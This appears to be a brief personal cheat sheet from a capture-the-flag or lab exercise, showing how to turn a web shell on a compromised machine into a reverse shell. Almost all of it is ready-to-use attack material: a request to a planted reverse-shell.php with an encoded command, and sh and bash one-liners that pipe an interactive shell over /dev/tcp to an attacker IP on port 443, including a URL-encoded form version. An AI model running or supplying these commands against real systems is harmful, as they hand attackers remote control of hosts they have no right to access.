
https://www.revshells.com/

if we have a web shell on the machine but want a reverse shell
http://10.10.51.95:12340/rms/images/reverse-shell.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.18.21.236%2F443%200%3E%261

sh -i >& /dev/tcp/10.18.21.236/443 0>&1

`bash -c "bash -i >& /dev/tcp/10.18.21.236/443 0>&1"`
url encoded: `bash+-c+"bash+-i+>%26+/dev/tcp/10.18.21.236/443+0>%261"&sub=Execute`

